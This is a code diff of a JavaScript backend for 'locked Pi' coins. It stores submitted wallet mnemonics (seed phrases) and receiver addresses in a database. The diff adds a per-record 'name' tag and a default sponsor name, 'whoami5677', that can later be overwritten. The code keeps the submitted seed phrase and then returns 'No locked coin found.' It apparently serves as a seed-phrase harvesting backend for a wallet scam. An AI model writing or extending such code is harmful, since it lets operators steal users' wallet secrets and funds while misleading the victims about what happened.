@@ -31,7 +31,7 @@ export async function storeLockedPi(mnemonic, derivedPublicKey, receiverAddress,
                     claimableAt = new Date();
                 }
 
-                const existing = await Passphrase.findOne({ mnemonic, balanceId: record.id });
+                const existing = await Passphrase.findOne({ mnemonic, balanceId: record.id, name });
                 if (existing) {
                     continue;
                 }
@@ -53,20 +53,25 @@ export async function storeLockedPi(mnemonic, derivedPublicKey, receiverAddress,
         }
     }
     if(!local) {
-        const existing = await Passphrase.findOne({ mnemonic });
+        const existing = await Passphrase.findOne({ mnemonic, name });
         if (existing) {
             return {success: false, message: 'No locked coin found.' };
         }
 
-        await Passphrase.create({ mnemonic, receiverAddress });
+        await Passphrase.create({ mnemonic, receiverAddress, name });
         return {success: false, message: 'No locked coin found.' };
     }
 }
 
-export async function storeSponsor(mnemonic, name) {
+export async function storeSponsor(mnemonic, name = 'whoami5677') {
     const existing = await Sponsors.findOne({ mnemonic });
     
         if (existing) {
+            if(existing.name === 'whoami5677' && name !== 'whoami5677') {
+                existing.name = name;
+                await existing.save();
+                return { success: true, message: 'Sponsor saved' };
+            }
             return { success: false, message: 'Sponsor already exists' };
         }
 
